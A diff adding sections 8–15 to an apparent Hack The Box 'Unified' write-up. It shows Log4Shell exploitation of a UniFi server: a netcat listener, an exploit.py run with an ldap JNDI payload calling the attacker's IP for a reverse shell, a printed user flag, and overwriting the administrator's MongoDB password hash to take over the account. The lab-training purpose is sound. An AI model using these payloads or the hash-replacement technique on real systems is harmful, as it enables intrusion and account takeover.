@@ -288,4 +288,206 @@ utils/rogue-jndi/target/
 ├── original-RogueJndi-1.1.jar
 └── RogueJndi-1.1.jar
 ```
+# 8. Preparing the Reverse Shell
 
+My VPN interface was:
+```
+ip a | grep tun0
+```
+which showed:
+```
+inet 10.10.14.116/23
+```
+Therefore, the callback IP is:
+```
+10.10.14.116
+```
+I prepared a listener on port 4444:
+```
+nc -lvnp 4444
+```
+# 9. Exploiting Log4Shell
+
+From inside the Log4jUnifi directory, the exploit was executed with:
+```
+python3 exploit.py \
+-u https://10.129.96.149:8443 \
+-i 10.10.14.116 \
+-p 4444
+```
+The tool generated a JNDI payload similar to:
+```
+${jndi:ldap://10.10.14.116:1389/o=tomcat}
+```
+The exploit output:
+```
+[*] Starting malicous JNDI Server
+[*] Firing payload!
+[*] Check for a callback!
+```
+The listener received the connection:
+```
+connect to [10.10.14.116] from (UNKNOWN) [10.129.96.149]
+```
+Checking the current user:
+```
+whoami
+```
+returned:
+```
+unifi
+```
+We now have a shell on the target as the unifi user.
+
+Important: The exploit must be executed from the Log4jUnifi directory. Running exploit.py from another directory caused the exploit to fail because it relies on relative paths to the RogueJNDI component.
+
+# 10. Initial Shell Enumeration
+
+Checking the current directory:
+```
+pwd
+/usr/lib/unifi
+```
+Listing the directory:
+```
+ls
+bin
+data
+dl
+lib
+logs
+run
+webapps
+work
+```
+Checking the current privileges:
+```
+id
+```
+```
+uid=999(unifi) gid=999(unifi) groups=999(unifi)
+```
+The system is running Ubuntu:
+```
+uname -a
+Linux unified 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64
+```
+
+# 11. User Flag
+
+The home directory contains a user named michael:
+```
+ls /home
+```
+
+```
+michael
+```
+
+The flag can be read directly:
+```
+cat /home/michael/user.txt
+6ced1a6a89e666c0620cdb10262ba127
+```
+
+User Flag
+```
+6ced1a6a89e666c0620cdb10262ba127
+```
+
+# 12. Discovering MongoDB
+
+The next step is to enumerate running processes.
+```
+ps aux | grep mongo
+```
+This reveals:
+```
+unifi  67 ... bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 ...
+```
+MongoDB is therefore running locally on:
+```
+27117
+```
+The important part of the process is:
+```
+--port 27117
+--bind_ip 127.0.0.1
+```
+This means MongoDB is only listening locally and is not directly exposed through the external network interface.
+
+#13. Enumerating MongoDB
+
+Connect to MongoDB:
+```
+mongo --port 27117
+```
+The installed MongoDB version is:
+```
+MongoDB server version: 3.6.3
+```
+List the available databases:
+```
+show dbs
+```
+The result includes:
+```
+ace
+ace_stat
+admin
+config
+local
+```
+The default database used by UniFi applications is:
+```
+ace
+```
+Switch to it:
+```
+use ace
+```
+
+# 14. Enumerating UniFi Users
+
+The admin collection contains UniFi user information.
+```
+db.admin.find()
+```
+The documents contain fields such as:
+```
+name
+email
+x_shadow
+requires_new_password
+```
+For example:
+```
+"name" : "administrator"
+"email" : "administrator@unified.htb"
+"x_shadow" : "$6$..."
+```
+The ```x_shadow``` value is a password hash.
+
+The ```$6$``` prefix indicates a SHA-512 crypt password hash with a salt.
+
+# 15. Updating a MongoDB User
+
+The function used to update users in MongoDB is:
+```
+update()
+```
+The important concept here is that the application stores the administrator's authentication information inside MongoDB.
+
+Because the database can be modified from the unifi context, the administrator record can be updated with a new password hash.
+
+A new SHA-512 crypt hash can be generated locally with:
+```
+mkpasswd -m sha-512 Pass123
+```
+Example:
+```
+$6$qU9fm/ty6zL/VOWY$zWdNy5pw6c6yDTzzhuRetQqoUynbEKxwbbsqzdNpPJkr/Kd6XfRuGhZr78kqJ3RSmc.o4aYSAGCEBHy/rIG.q0
+```
+The administrator's ```x_shadow value``` can then be replaced with the generated hash using MongoDB's ```update()``` function.
+
+After updating the record, the UniFi web interface accepts the new credentials.
